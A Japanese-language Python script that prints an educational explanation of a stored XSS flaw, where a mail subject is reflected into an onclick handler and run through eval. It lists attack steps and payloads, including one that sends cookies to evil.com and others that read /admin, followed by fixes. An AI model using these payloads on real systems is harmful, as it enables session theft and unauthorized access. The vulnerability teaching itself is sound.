#!/usr/bin/env python3
"""
送信メールボックス件名XSS脆弱性テスト

脆弱性:
- 送信メールボックスの件名がイベントハンドラ内に反射
- JavaScriptのeval関数で件名を実行
- 二重引用符エスケープによるJavaScript実行

攻撃例:
件名: "; alert(1); var dummy="
結果: eval('var displaySubject = ""; alert(1); var dummy="";');
"""

def print_vulnerability_info():
    """脆弱性の詳細説明"""
    print("🔒 送信メールボックス件名XSS脆弱性")
    print("=" * 35)
    
    print("\n📝 脆弱性の概要:")
    print("- 送信メールボックスの件名がJavaScriptのイベントハンドラ内に反射")
    print("- 件名がHTMLではサニタイズされるが、JavaScript内では未サニタイズ")
    print("- eval関数を使用してJavaScriptコードとして実行")
    
    print("\n🎯 脆弱なコード:")
    print("テンプレート:")
    print('onclick="previewEmail(\'{{ email[3] | safe }}\')"')
    print("\nJavaScript:")
    print("eval('var displaySubject = \"' + subject + '\";');")
    
    print("\n💥 攻撃ペイロード例:")
    examples = [
        {
            "payload": '"; alert(1); var dummy="',
            "description": "基本的なJavaScript実行",
            "result": 'eval(\'var displaySubject = ""; alert(1); var dummy="";\')'
        },
        {
            "payload": '"; alert(document.domain); var x="',
            "description": "ドメイン情報取得",
            "result": 'eval(\'var displaySubject = ""; alert(document.domain); var x="";\')'
        },
        {
            "payload": '"; fetch("/admin").then(r=>r.text()).then(d=>alert(d.slice(0,100))); var x="',
            "description": "管理者ページの内容取得",
            "result": "管理者ページの内容をアラートで表示"
        },
        {
            "payload": '"; document.location="http://evil.com/?cookie="+document.cookie; var x="',
            "description": "クッキー窃取",
            "result": "クッキー情報を外部サイトに送信"
        }
    ]
    
    for i, example in enumerate(examples, 1):
        print(f"\n{i}. {example['description']}")
        print(f"   件名: {example['payload']}")
        print(f"   実行: {example['result']}")

def print_attack_steps():
    """攻撃手順"""
    print("\n🔬 攻撃手順:")
    print("=" * 15)
    
    print("\n1. メール作成:")
    print("   - /mail/compose にアクセス")
    print("   - 受信者: admin（または任意のユーザー）")
    print("   - 件名: ペイロードを入力")
    print("   - 本文: 任意の内容")
    print("   - メール送信")
    
    print("\n2. 送信メールボックス確認:")
    print("   - /mail/sent にアクセス")
    print("   - 作成したメールの件名をクリック")
    print("   - JavaScriptが実行される")
    
    print("\n3. 攻撃例:")
    print('   件名: "; alert(\'XSS成功!\'); var dummy="')
    print("   結果: 件名クリック時にアラートが表示")

def print_test_payloads():
    """テスト用ペイロード"""
    print("\n💣 テスト用ペイロード:")
    print("=" * 20)
    
    payloads = [
        {
            "level": "基本",
            "payload": '"; alert(1); var dummy="',
            "description": "基本的なアラート実行"
        },
        {
            "level": "情報収集",
            "payload": '"; alert("Cookie: " + document.cookie.slice(0,50)); var x="',
            "description": "クッキー情報の一部を表示"
        },
        {
            "level": "DOM操作",
            "payload": '"; document.body.style.background="red"; alert("DOM操作成功"); var x="',
            "description": "背景色を変更してDOM操作を証明"
        },
        {
            "level": "高度",
            "payload": '"; var xhr=new XMLHttpRequest(); xhr.open("GET","/admin",false); xhr.send(); alert("Admin: " + xhr.responseText.slice(0,50)); var x="',
            "description": "管理者ページへのアクセス試行"
        }
    ]
    
    for payload in payloads:
        print(f"\n### {payload['level']}レベル")
        print(f"説明: {payload['description']}")
        print(f"ペイロード: {payload['payload']}")

def print_html_behavior():
    """HTML側の動作説明"""
    print("\n🔍 HTML/JavaScript動作:")
    print("=" * 25)
    
    print("\n1. HTMLテンプレート処理:")
    print("   {{ email[3] | safe }} → HTMLエスケープなし")
    print("   しかし、ブラウザがHTML表示時にサニタイズ")
    
    print("\n2. JavaScript実行時:")
    print("   onclick=\"previewEmail('件名内容')\"")
    print("   → JavaScript文字列内では未サニタイズ")
    
    print("\n3. eval関数での実行:")
    print("   eval('var displaySubject = \"' + subject + '\";');")
    print("   → 件名内容がJavaScriptコードとして実行")
    
    print("\n4. 攻撃成功例:")
    print('   件名: "; alert(1); var dummy="')
    print('   HTML: onclick="previewEmail(\'"; alert(1); var dummy="\');"')
    print('   eval: eval(\'var displaySubject = ""; alert(1); var dummy="";\')')
    print("   結果: alert(1)が実行される")

def print_prevention():
    """対策方法"""
    print("\n🛡️ 対策方法:")
    print("=" * 15)
    
    print("\n### 1. JavaScript文字列エスケープ")
    print("```javascript")
    print("function escapeJs(str) {")
    print("    return str.replace(/\\\\/g, '\\\\\\\\').replace(/'/g, '\\\\\\'').replace(/\"/g, '\\\\\"');")
    print("}")
    print("```")
    
    print("\n### 2. eval関数の使用禁止")
    print("```javascript")
    print("// 危険")
    print("eval('var displaySubject = \"' + subject + '\";');")
    print("")
    print("// 安全")
    print("var displaySubject = subject;")
    print("```")
    
    print("\n### 3. CSP（Content Security Policy）")
    print("```html")
    print("<meta http-equiv=\"Content-Security-Policy\" ")
    print("      content=\"script-src 'self'; object-src 'none';\">")
    print("```")

if __name__ == "__main__":
    print_vulnerability_info()
    print_attack_steps()
    print_test_payloads()
    print_html_behavior()
    print_prevention()
    
    print("\n" + "=" * 50)
    print("📖 この脆弱性は教育目的で作成されています")
    print("🔒 実際のアプリケーションでは適切なサニタイズを実装してください")